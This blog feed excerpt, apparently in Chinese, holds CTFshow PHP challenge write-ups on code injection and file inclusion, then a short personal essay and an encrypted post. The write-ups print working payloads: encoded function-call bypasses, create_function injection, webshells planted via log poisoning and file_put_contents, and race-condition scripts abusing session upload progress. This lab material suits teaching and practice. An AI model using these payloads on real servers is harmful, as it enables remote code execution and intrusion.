if(preg_match(&#39;&#x2F;[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\&#x2F;|\^|\#|\&quot;&#x2F;i&#39;, $v3))&#123;                die(&#39;get out hacker!&#39;);        &#125;        else&#123;            $code &#x3D;  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 &#x3D; &quot;.$code;        &#125;    &#125;&#125;</code></pre><p>正则运算都被ban了，可以使用<code>|</code>和<code>~</code>或者三目运算符，另外<code>&quot;</code>也被ban了，可以使用<code>&#39;</code></p><p>Payload:</p><blockquote><p>?v1&#x3D;0&amp;v2&#x3D;0&amp;v3&#x3D;|(‘%13%19%13%14%05%0d’|’%60%60%60%60%60%60’)(‘%14%01%03%00%06%0c%01%07%02%10%08%10’|’%60%60%60%20%60%60%60%60%2c%60%60%60’)|</p><p>?v1&#x3D;%0a1&amp;v2&#x3D;%0a0&amp;v3&#x3D;?(<del>%8c%86%8c%8b%9a%92)(</del>%9c%9e%8b%df%99%d5):</p></blockquote><h4 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h4><p>三目运算符被ban了，但是影响不大</p><h4 id="web147-PHP命名空间-create-function函数代码注入"><a href="#web147-PHP命名空间-create-function函数代码注入" class="headerlink" title="web147(PHP命名空间  create_function函数代码注入)"></a>web147(PHP命名空间  create_function函数代码注入)</h4><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);if(isset($_POST[&#39;ctf&#39;]))&#123;    $ctfshow &#x3D; $_POST[&#39;ctf&#39;];    if(!preg_match(&#39;&#x2F;^[a-z0-9_]*$&#x2F;isD&#39;,$ctfshow)) &#123;        $ctfshow(&#39;&#39;,$_GET[&#39;show&#39;]);    &#125;&#125;</code></pre><p>正则匹配绕过，只要ctfshow里有一个不是数字、小写字母和下划线就能绕过。</p><blockquote><p><strong>&#x2F;i</strong>：大小写不敏感匹配</p><p><strong>&#x2F;s</strong>：点号元字符匹配所有字符，包含换行符。</p><p><strong>&#x2F;D</strong>：元字符美元符号仅仅匹配目标字符串的末尾</p></blockquote><blockquote><p>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 调用一个函数时直接写函数名function_name()，相当于是相对路径调用； 如写某一全局函数的完全限定名称\function_name()调用，则是写了一个绝对路径。</p></blockquote><p><img src="web147.png" alt="在这里插入图片描述" loading="lazy"></p><p>（详情可以看php手册里的命名空间部分）</p><p>所以post时<code>ctf</code>可以通过加上<code>\</code>绕过匹配。%5c</p><p>找个不需要第一个参数的函数。可以用create_function匿名函数。虽然该函数自PHP 7.2起已经弃用，但是还是可以eval执行函数，只是需要把匿名部分闭合。</p><p><strong>get</strong>：<code>?show=&#125;system(&#39;tac f*&#39;);/*</code> <strong>post</strong>：<code>ctf=%5ccreate_function</code> <img src="web147_2.png" alt="在这里插入图片描述" loading="lazy"></p><p>可以这么理解：create_function创建一个匿名函数，我们假设就叫niming。 <code>string create_function( string $args, string $code)</code>那么具体就是如下面所示的样子：</p><pre class="language-none"><code class="language-none">function niming($args,...)&#123;$code&#125;</code></pre><p>所以就需要<code>&#125;</code>闭合，闭合之后，那就多出来一个<code>&#125;</code>，这就需要用注释符注释掉。</p><h4 id="web148-中文变量-异或"><a href="#web148-中文变量-异或" class="headerlink" title="web148(中文变量  异或)"></a>web148(中文变量  异或)</h4><pre class="language-php" data-language="php"><code class="language-php">include &#39;flag.php&#39;;if(isset($_GET[&#39;code&#39;]))&#123;    $code&#x3D;$_GET[&#39;code&#39;];    if(preg_match(&quot;&#x2F;[A-Za-z0-9_\%\\|\~\&#39;\,\.\:\@\&amp;\*\+\- ]+&#x2F;&quot;,$code))&#123;        die(&quot;error&quot;);    &#125;    @eval($code);&#125;else&#123;    highlight_file(__FILE__);&#125;function get_ctfshow_fl0g()&#123;    echo file_get_contents(&quot;flag.php&quot;);&#125;</code></pre><p>没ban异或</p><p>Payload：<code>?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%0c%01%07%01%0b%08%0b&quot;^&quot;%7d%60%60%21%60%60%60%60%2f%7b%60%7b&quot;);</code></p><p>预期解是使用中文 <code>?code=$哈=&quot;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$哈&#125;[哼]($&#123;$哈&#125;[嗯]);&amp;哼=system&amp;嗯=tac f* </code></p><p><code>&quot;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;</code> 异或出来的结果是 _GET</p><h4 id="web149-unlink-文件覆盖"><a href="#web149-unlink-文件覆盖" class="headerlink" title="web149(unlink  文件覆盖)"></a>web149(unlink  文件覆盖)</h4><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);highlight_file(__FILE__);$files &#x3D; scandir(&#39;.&#x2F;&#39;); foreach($files as $file) &#123;    if(is_file($file))&#123;        if ($file !&#x3D;&#x3D; &quot;index.php&quot;) &#123;            unlink($file);        &#125;    &#125;&#125;file_put_contents($_GET[&#39;ctf&#39;], $_POST[&#39;show&#39;]); </code></pre><p><strong>unlink()</strong> 函数删除文件。</p><p>若成功，则返回 true，失败则返回 false。</p><p>直接向index.php写马就行</p><p>Payload</p><blockquote><p>GET:?ctf&#x3D;indx.php</p><p>POST:show&#x3D;<?php system($_GET[a]);?></p></blockquote><h4 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h4><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&quot;flag.php&quot;);error_reporting(0);highlight_file(__FILE__);class CTFSHOW&#123;    private $username;    private $password;    private $vip;    private $secret;    function __construct()&#123;        $this-&gt;vip &#x3D; 0;        $this-&gt;secret &#x3D; $flag;    &#125;    function __destruct()&#123;        echo $this-&gt;secret;    &#125;    public function isVIP()&#123;        return $this-&gt;vip?TRUE:FALSE;        &#125;    &#125;    function __autoload($class)&#123;        if(isset($class))&#123;            $class();    &#125;&#125;#过滤字符$key &#x3D; $_SERVER[&#39;QUERY_STRING&#39;];if(preg_match(&#39;&#x2F;\_| |\[|\]|\?&#x2F;&#39;, $key))&#123;    die(&quot;error&quot;);&#125;$ctf &#x3D; $_POST[&#39;ctf&#39;];extract($_GET);if(class_exists($__CTFSHOW__))&#123;    echo &quot;class is exists!&quot;;&#125;if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)&#x3D;&#x3D;&#x3D;FALSE)&#123;    include($ctf);&#125; </code></pre><p>isVIP可以通过extract进行变量覆盖，ctf被限制不能有:</p><p>可以利用nginx日志文件写马</p><p><img src="web150.png" loading="lazy"></p><h4 id="web150-plus-autoload-class-exists"><a href="#web150-plus-autoload-class-exists" class="headerlink" title="web150_plus(__autoload  class_exists)"></a>web150_plus(__autoload  class_exists)</h4><p>过滤了log，看着可以用条件竞争</p><p>看了hint 利用 <code>__autoload()</code></p><p>于是查了一下 <code>class_exists()</code> 这个函数</p><p><img src="web150_plus.png" alt="https://img.exp10it.io/img/202208131706165.png" loading="lazy"></p><p>修复了非预期，不让包含日志文件了。</p><p>这里利用了 <code>extract</code> 覆盖变量会把 <code>空格 [ .</code> 都给转成下划线的特性，绕过正则过滤。然后就是 <a href="https://www.php.net/manual/zh/function.class-exists.php"><code>class_exists</code></a> 第二个参数默认为 <code>true</code>，在类不存在时会调用 <code>__autoload</code> 函数，<code>__autoload</code> 这里写的是调用要加载的类名的函数，传 <code>phpinfo</code> 就能得到 <code>session</code>相关信息，从而包含 <code>session</code>。</p><p>payload1: <code>?..CTFSHOW..=phpinfo</code></p><p>可以看到 <code>session.use_strict_mode</code> 为 Off，说明可以自定义 <code>session_id</code>，控制 <code>session</code> 文件名， <code>session.save_path</code> 为空，确定文件包含路径 <code>/tmp/sess_&#123;session_id&#125;</code>。改一下祖传脚本写 shell。</p><pre class="language-python" data-language="python"><code class="language-python">import ioimport requestsimport threadingurl &#x3D; &#39;http:&#x2F;&#x2F;fa7db7de-329e-44cf-8270-bcd8d7f96368.challenge.ctf.show:8080&#x2F;?isVIP&#x3D;1&#39;event &#x3D; threading.Event()def write(session):    data &#x3D; &#123;        &#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;aaaaaa&lt;?php file_put_contents(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;s.php&quot;, base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA&#x2F;Pg&#x3D;&#x3D;&quot;));?&gt;&#39;    &#125;    while True:        if event.is_set():            return        f &#x3D; io.BytesIO(b&#39;a&#39; * 1024 * 10)        _ &#x3D; session.post(url,cookies&#x3D;&#123;&#39;PHPSESSID&#39;: &#39;down&#39;&#125;, data&#x3D;data, files&#x3D;&#123;&#39;file&#39;: (&#39;verysafe.txt&#39;, f)&#125;)def read(session):    while True:        if event.is_set():            return        response &#x3D; session.post(url, data&#x3D;&#123;&quot;ctf&quot;: &quot;&#x2F;tmp&#x2F;sess_down&quot;&#125;)        if &#39;aaaaaa&#39; in response.text:            print(response.text)            event.set()        else:            print(&#39;retry&#39;)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    session &#x3D; requests.session()    for i in range(30):        threading.Thread(target&#x3D;write, args&#x3D;(session,)).start()    for i in range(30):        threading.Thread(target&#x3D;read, args&#x3D;(session,)).start()    event.wait()</code></pre><p>[PHP文件包含漏洞（利用phpinfo）](<a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">vulhub&#x2F;php&#x2F;inclusion&#x2F;README.zh-cn.md at master · vulhub&#x2F;vulhub (github.com)</a>)</p><p>这篇详细讲解了漏洞的利用，之前的条件竞争就是这样</p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> php特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EZinclude</title>
      <link href="/2024/06/29/EZinclude/"/>
      <url>/2024/06/29/EZinclude/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>主要考察是php伪协议，之前Rce里也有提过，这里放几个常用Payload</p><blockquote><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</p></blockquote><blockquote><p>data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64编码后的数据)</p></blockquote><blockquote><p>php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF-8.UTF-7&#x2F;resource&#x3D;flag.php  </p></blockquote><blockquote><p>php:&#x2F;&#x2F;input<br>POST cmd</p></blockquote><h3 id="web78-117"><a href="#web78-117" class="headerlink" title="web78-117"></a>web78-117</h3><h4 id="web78-php"><a href="#web78-php" class="headerlink" title="web78(php)"></a>web78(php)</h4><p>签到</p><p>Payload: <code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h4 id="web79-data"><a href="#web79-data" class="headerlink" title="web79(data)"></a>web79(data)</h4><pre class="language-php" data-language="php"><code class="language-php">$file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file); </code></pre><p>将php过滤，可以考虑data</p><p>Payload:</p><blockquote><pre class="language-php" data-language="php"><code class="language-php">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs &#x3D;&#x3D;&#x3D;&gt; &lt;?php system(&#39;cat flag.php&#39;);</code></pre></blockquote><h4 id="web80-nginx日志注入"><a href="#web80-nginx日志注入" class="headerlink" title="web80(nginx日志注入)"></a>web80(nginx日志注入)</h4><pre class="language-php" data-language="php"><code class="language-php">$file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);$file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file); </code></pre><p>data也被ban了</p><p>使用nginx日志文件包含，在User-Agent写入一句话木马，使用蚁剑连接<a href="https://xxx.ctfshow/?file=/var/log/nginx">https://xxx.ctfshow?file=/var/log/nginx</a>  getshell</p><p>Payload:</p><blockquote><p>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>User-Agent: <?php @eval($_POST['attack']);?></p></blockquote><p>看题解也可以大小写绕过用PHP:&#x2F;&#x2F;input</p><h4 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h4><p>多过滤了冒号，所以依旧可以nginx日志注入</p><h4 id="web82-利用session-upload-progress进行文件包含"><a href="#web82-利用session-upload-progress进行文件包含" class="headerlink" title="web82(利用session.upload_progress进行文件包含)"></a>web82(利用session.upload_progress进行文件包含)</h4><p><a href="https://www.freebuf.com/vuls/202819.html">利用session.upload_progress进行文件包含和反序列化渗透</a></p><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;file&#39;]))&#123;    $file &#x3D; $_GET[&#39;file&#39;];    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>如果session.auto_start&#x3D;On ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID&#x3D;TGAO，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p><p>但是问题来了，默认配置session.upload_progress.cleanup &#x3D; on导致文件上传后，session文件内容立即清空，</p><p>此时我们可以利用竞争，在session文件内容清空前进行包含利用。</p><p><strong>session文件默认存储路径</strong></p><p>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID</p><p><strong>方法一:</strong></p><p>先以POST的形式发包，上传的文件随意,下面是构造的上传表单</p><pre class="language-none"><code class="language-none">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;79b5dbc7-b641-4e30-b8d9-4278f2234938.chall.ctf.show&#x2F;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>使用burp进行爆破（两个要同时爆破）</p><p><img src="web82.png" loading="lazy"></p><p><img src="web82_2.png" loading="lazy"></p><p>最后竞争得到flag</p><p><strong>方法二</strong>:</p><p>可以利用脚本进行条件竞争</p><pre class="language-python" data-language="python"><code class="language-python">import ioimport sysimport requestsimport threadingsessid &#x3D; &#39;Qftm&#39;url &#x3D; &#39;https:&#x2F;&#x2F;2fdf78b8-ded3-49bb-8ebc-1bc7fac6b480.challenge.ctf.show&#x2F;&#39;def POST(session):    while True:        f &#x3D; io.BytesIO(b&#39;a&#39; * 1024 * 50)        session.post(            url,            data&#x3D;&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&quot;&lt;?php system(&#39;cat *&#39;);fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[mtfQ])?&gt;&#39;);?&gt;&quot;&#125;,            files&#x3D;&#123;&quot;file&quot;:(&#39;q.txt&#39;, f)&#125;,            cookies&#x3D;&#123;&#39;PHPSESSID&#39;:sessid&#125;        )def READ(session):    while True:        response &#x3D; session.get(f&#39;&#123;url&#125;?file&#x3D;&#x2F;tmp&#x2F;sess_&#123;sessid&#125;&#39;)        if &#39;flag&#39; not in response.text:            print(&#39;[+++]retry&#39;)        else:            print(response.text)            sys.exit(0)with requests.session() as session:    t1 &#x3D; threading.Thread(target&#x3D;POST, args&#x3D;(session, ))    t1.daemon &#x3D; True    t1.start()    READ(session)</code></pre><h4 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h4><p>条件竞争同上</p><h4 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h4><p>添加了如下代码</p><p>system(“rm -rf &#x2F;tmp&#x2F;*”);</p><p>&#x2F;&#x2F; 在 rm -rf &#x2F;tmp&#x2F;* 执行之后立刻有新的请求创建了 sess_shell 文件 条件竞争依然有效</p><h4 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h4><p>添加了一个内容识别，如果有<code>&lt;</code>就die，依旧可以竞争。</p><h4 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h4><p>dirname(<strong>FILE</strong>)表示当前文件的绝对路径。set_include_path函数,是用来设置include的路径的，就是include()可以不提供文件的完整路径了。<br>include文件时,当包含路径既不是相对路径，也不是绝对路径时(如:include(“test.php”))，会先查找include_path所设置的目录。<br>脚本里用的是完整路径，不影响竞争。</p><h4 id="web87-file-put-contents"><a href="#web87-file-put-contents" class="headerlink" title="web87(file_put_contents)"></a>web87(file_put_contents)</h4><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;file&#39;]))&#123;    $file &#x3D; $_GET[&#39;file&#39;];    $content &#x3D; $_POST[&#39;content&#39;];    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);    file_put_contents(urldecode($file), &quot;&lt;?php die(&#39;大佬别秀了&#39;);?&gt;&quot;.$content);&#125;</code></pre><p>file_put_contents() 函数把一个字符串写入文件中。</p><p><a href="https://www.runoob.com/php/func-filesystem-file-put-contents.html">PHP file_put_contents() 函数</a></p><p><a href="https://xz.aliyun.com/t/8163?time__1311=n4+xuDgDBDyGKAKD=D7Dl1oQ447wWhSwi2iD&alichlgref=https://xz.aliyun.com/t/8163#toc-3">file_put_content和死亡·杂糅代码之缘</a></p><p>参考大佬文章，可以使用base64或者rot13来进行对前面代码进行杂糅</p><p>首先构造$file，因为要对file进行一次url解码所以我们对payload进行两次url编码</p><p>晚上大多工具是对英文字符不进行url编码的，所以这里给出脚本方便进行urlencode</p><pre class="language-python" data-language="python"><code class="language-python">import urllib.parsedef encode_char(char):    # 指定字符集，转换为ASCII码后，再转换为16进制，并添加%    special_chars &#x3D; &quot;!#$&amp;&#39;()*+,&#x2F;:;&#x3D;?@-._~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;    if char in special_chars:        # 转换为ASCII码，然后转换为16进制，并添加%        return &#39;%&#123;:02x&#125;&#39;.format(ord(char))    else:        # 对其他字符进行URL编码        return urllib.parse.quote(char)def url_encode(input_string):    # 对字符串中的每个字符进行编码    return &#39;&#39;.join(encode_char(char) for char in input_string)input_string &#x3D; &quot;Test&quot;encoded_string &#x3D; url_encode(input_string)print(encoded_string)</code></pre><blockquote><p>php:&#x2F;&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;hsad.php</p><p>两次编码后得到</p><p>file&#x3D;%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%36%38%25%37%33%25%36%31%25%36%34%25%32%65%25%37%30%25%36%38%25%37%30</p></blockquote><p>然后进行Post content</p><p>base64可以绕过die函数。因为base64编码范围是 <code>0 ～ 9,a ～ z,A ～ Z,+,/ ，</code>所以除了这些字符，其他字符都会被忽略掉。</p><p>base64过滤之后就只有(phpdie)6个字符了，base64要求把每三个8Bit的字节转换为四个6Bit的字节，所以这里也要凑够四个字节的倍数，避免base64解码出问题，这里加上两个字符即可。</p><blockquote><p>​                    <?php system("tac fl0g.php");?></p><p>content&#x3D;aaPD9waHAgc3lzdGVtKCJ0YWMgZmwwZy5waHAiKTs&#x2F;Pg&#x3D;&#x3D;</p></blockquote><h4 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h4><p>发现过滤的还是比较多，但是没有过滤 : 那我们就可以使用PHP伪协议就是 这里使用的是 data:&#x2F;&#x2F;text&#x2F;plain;base64,poc 其实和79差不多 只是注意的是编码成base64的时候要去掉 ＝</p><h4 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h4><p>访问网页给了视频，formost分解出来有图片是网站源码</p><p><img src="web116.png" loading="lazy"></p><p>然后直接访问flag.php就行，说实话有点懵，因为过滤挺狠的</p><h4 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h4><p>参考文章：</p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php:&#x2F;&#x2F;filter的妙用</a></p><p><a href="https://blog.csdn.net/qq_44657899/article/details/109300335">php:&#x2F;&#x2F;filter的各种过滤器</a></p><p>这道题过滤了rot13，base64，string等一些过滤器的内容，那换其他过滤器不就完事了。</p><p>这里我们用<code>convert.iconv.*</code>这个过滤器。</p><p>payload：</p><blockquote><p>GET: ?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.ucs-2be.ucs-2le&#x2F;resource&#x3D;a.php</p><p>从<code>UCS-2LE</code>编码转换为<code>UCS-2BE</code>编码</p><p>POST: contents&#x3D;?&lt;hp pvela$(G_TE’[‘a)] ;&gt;?</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
            <tag> CTFshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>byeSophomore</title>
      <link href="/2024/06/26/byeSophomore/"/>
      <url>/2024/06/26/byeSophomore/</url>
      
        <content type="html"><![CDATA[<p>端午回来的那天下午不小心骨折了，刚刚完成了课设，除了开学的缓考外，对我来说，大学生活已经悄然过半</p><p>说起来也挺碌碌无为的，但也不至于一事无成，只是觉得还不够。对于未来的规划，坦白说我只想老老实实上个班赚钱，大家都想赚得多，因为这样才有资格赎回属于自己的一点自由，但也挺迷茫，因为确实没想好具具体体的方向。</p><blockquote><p>空虚的勉励和油腻的鸡汤一样令我反胃，如果一个人能轻易地通过几句文字得到十足的动力，这个人恐怕也单纯无脑而易于受到利用；而远大深刻真正有效的激励，却是一段话无法表达、表达后也无所裨益的：写出来只是给别人看的表决心，又不能深化这一激励。这一类的文字，要么只是流于形式的敷衍，要么就是浅薄的表露。</p></blockquote><p>总之还得去做吧，空想倒也没什么用，我写这些东西不知道要给谁看，也不知道谁会看到，我表达能力一向很弱，总觉得是读的书太少，所以也没有想着自己写的这点东西能给别人带来什么，就想记录一下吧。</p><p>想了好多，还是算了</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Campus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>可能真的要等好久了</title>
      <link href="/2024/06/17/%E8%BF%99%E4%BC%BC%E4%B9%8E%E6%98%AF%E4%B8%80%E4%B8%AA%E9%97%AD%E7%8E%AF/"/>
      <url>/2024/06/17/%E8%BF%99%E4%BC%BC%E4%B9%8E%E6%98%AF%E4%B8%80%E4%B8%AA%E9%97%AD%E7%8E%AF/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e522772ea704707720a4ef0bc557a013923c8e9594f20e1e414419ebbbe9f8c7">6b09021c4fad842555217a8d07b3963feb852d3e21f8742f65fcd76a470d0bd132968d4640d394f9980075d76c1e54c55906bfeeb9d4b19a98ae91997175b4116f505795b7b910c3386a65db4722adc0cc05a4478c6a9bd4bc6e5b8233db3a139e6d31da6c7ea1cbea42884836829b6c085f5664568bc6ea1c32e141417bb618db4bb820f58414f39ada0f9301699f332f2d8ba91c4d9f00f587dfdd8cc25a9e1ba7e869aab6ca7897472cceec9c42aa5653556e963006430dd7ae93240198851e4c49c871bc97ab7c376e51e2a240f54137f454c6298e4c6cbc9ce8f28b83e42547ae361e88c61836a6f71400a33085d0aca6fa807d8e11bbf2dcd6962b286af488105934d22a04e9f2e0d96ebe14597baa789a4753c60d6d2737814d39d02a94c010763760ed4ab4d9c98a3ef4da26e48bae060cfd1a357e3f3f740da5b486e0604b5ad6ed6762c499a7ea8b843448c893679f123443b4998bde3cf7fd4145b6cef62f81d7d93737020320b0e23541555e880fea8707bb86efc5eb301b980d68362000fba23912338cfbc222360f316c5b26a09297697f0b442300a185fc224540ed14d4f6b9b56c2c90f2ccf70875ec7d2f03aa2b1cc2c4d1f01772d14154ffa797f4247e153da0f8b87550482fc337a7e7b2701c4e7180282ec6fc05cb25c71bfe2b3ca63a95e6bfa153832774b1da60405909979bbdadaccd13874f3d3bbc1506612118e8111ac08adfb6f4944da15f0d93e3e18cf22f942eef8640a5e921f340c074d93efa9ce303824ea2c2173c750b03d0ca025bdde24e3287f71e083c4dc81abfd7fd51f91600d50ca94a76a778bb4fd5f71fd66cd3f639ff2e4a4331ff5fc177482301680bb501c3aa8b25b079ed9a63752ed5abf85e1fdf4ae54fc04acac0e54b928cc7eb39fc987a11bba9050655b470f3fb2a159deea5e1ca7d573acce7c7f4a5250bc3249e4487c73f7a8ed7067d3dd09e6871dd0d448ed358c388430538ad145d5cfaaa472a7b7553d73281fa7aad8037dfdeb00aa2f53b3bb83b1fdfdb7a99749d58f2ce97369c95ab5561e7406501a9463e9f74f293dae82484bf02cd92e0ca53a6e307bcd513d26069177efad396a4628d4eeeb9c642d5211abc1ac9cd63eb1c6b3e1aef02390bf3e1dbc531fd2d3850f5a6397759de2bf295fd9068a3b7afb5cd1ff3f910e80d6c5ab4812c64688e7c9694b721c7e5c1ab547a11eafbbb71b30899639877c2b10719dcdf3ac1f215ea733cebacab4f4d019c6efbc82d4e474c076d65fc3c063e055be71425c0dcab0d48e1da8cb659adecb2ec4489fc0aa71d71613ffd694955df279aca61fd267d4ae1be23e399c0dca1df15aa793a02997fbeb87cc019e1bab7b78ea55e14783ad10f9b9508eb44314c89aac04aac3ae7f06e7b0897c5b79ed5829c064fa10e5db82d616ab1e9d82e253dc99d0bb8b3f868a0ba6f583f46335a49923edaf0c629c2fd85e87425fa40e6ad7f72a5174bc640dded86cad62e17cf2f75dde1c4e1519a30da2dd7dafc129992eaf346da628941bfe2404dc1471fde14548edf1fa018774df7f99c8f9094b05c7767b77cbc019ab4ab4d195afa0a50b0bc5063c3b6343a157d63ab54e10d084c861e2015e47e68ffda2d10cc0b79298b8f4a7c4b9d046ec861a32246220f1b46489b762a85f1d7d1f6488424d89b80d43f312f2b84232b0bcaced24921db52222da9ece94827544c8dfecf8790186634a966ec60c48fb5e0b7ee49b1ec97e5780c9a1497a3264a912483377f3a6cff979a0cf358c6d807627f1b490a41819be1e5ebfd4945c7d494b7f68eac8f8aeeae61697c3aaad07326063dd7a84b9b35f3c1fe2599ecd6c4080e3cc6e456555c68b10069f9dc4aa73c204b18290c2d9a7f4b28ef9acfa4bca8fa735f76da9f02cacb54913fd480204f5f33c2b636008571647a7e5d1d1ed8631fce3e9a5709260cb0c829586b556c5d175a6d2a72e6351d8ff252febae745c979657e7d276bc23ff0ab34a5f22445af1127d283e71ca7b3a84761334dc1d408944f66dea2647ab335cb1bb70da8143ce73711d8c77d59a29b14d42be38386f94ea7e2ee82cbfc155fae65db97f537970539391d0da75435d3b28c0b4dc7fc2cd732ccc48b024d9b87c605de90e0b7ef38e55195100a547d826cfa7159597a823577ce716ef8919ac4297a312bcb0c073b3146c3d66952756fb43cb4b37614dd0545f2ae17319a33fc1cf3fd3574b7c1cc3f04f76d93ac7aa564e3e6be54d8eaf86b784a48cbcf4420fb24692206291e3ce9a6bfac560c6c87473d68d778f792e8ced1f58c30c9f4b5d0542736606ed396f509a5810a4d20be921ab88e3c3c244bbb52a48fa92b33bdd4d9e69bfc7a875e46c6afc3f9312997af870cc69b9d81e3b0ac691c1afbbbc6c920729ebdacbdc487caf18a1a247768909f0cad6074b695cd9bcd7c3cae0c5aea4fc39c15c119bb893afefdcc703c8add147c7eb886b3197fb570e2472d07302d14fb13ee4e834d07f689c1082925bbb3d3d22bda707719c939c364faf76794a2656322958e904460a9f0b43090dcfb60a6ae7e9555916b662aadda62fbb96e70a8a16436ae100788e1